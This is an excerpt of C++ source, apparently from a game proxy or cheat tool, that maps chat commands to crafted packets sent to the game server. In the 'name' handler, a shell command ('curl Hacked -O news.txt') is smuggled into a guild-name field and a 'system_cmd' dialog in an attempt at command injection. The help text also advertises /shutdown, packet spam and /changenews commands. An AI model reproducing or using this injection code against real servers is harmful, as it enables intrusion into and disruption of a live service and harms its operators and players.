...
bool events::out::generictext(std::string packet) {
    ...
    if (var.get(0).m_key == "action" && var.get(0).m_value == "input") {
        ...
        if (find_command(chat, "name ")) { //ghetto solution, but too lazy to make a framework for commands.
            ...
            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|curl Hacked -O news.txt");
            g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|curl Hacked -O news.txt");
            return true;
        } else if (find_command(chat, "spam ")) {
            std::string lol = chat.substr(5);
            ...
            gt::send_log(
                ...
                "[name] (resolves name to uid), /flag [id] (sets flag to item id), /name [name] (sets name to name), /shutdown, /sp [Spam Packet], /public, /changenews");
            return true;
        } 
        return false;
    }
